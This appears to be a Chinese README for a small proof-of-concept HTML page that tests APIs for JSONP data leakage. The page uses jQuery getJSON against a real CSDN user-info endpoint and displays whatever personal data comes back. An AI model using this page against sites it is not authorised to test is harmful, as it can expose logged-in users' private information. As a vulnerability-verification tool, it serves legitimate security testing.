# JSONP漏洞快速验证POC
 一个可以快速验证JSONP漏洞的小脚本。

### 使用方法

HTML代码如下：

```html
<html>
    <head>
        <title>JSONP漏洞验证</title>
        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
    </head>
    <body>
        <h4>从本页面发起请求所获取的JSON数据如下，如果依然包含敏感信息，则说明该API存在JSONP漏洞：</h4>
        <script>
            $.getJSON("https://www.csdn.net/community/toolbar-api/v1/get-user-info", function(data){
                  var items = [];
                  $.each( data, function( key, val ) {
                    items.push( "<li id='" + key + "'>" + val + "</li>" );
                  });
                 
                  $( "<ul/>", {
                    "class": "my-new-list",
                    html: items.join( "" )
                  }).appendTo( "body" );
            });
        </script>
    </body>
</html>

```

把上述代码保存成一个 html 文件，然后将 getJSON() 函数里的 API 链接换成你自己的链接，再用浏览器打开该 html，如果页面上依然能显示敏感数据，则说明存在 JSONP 漏洞。
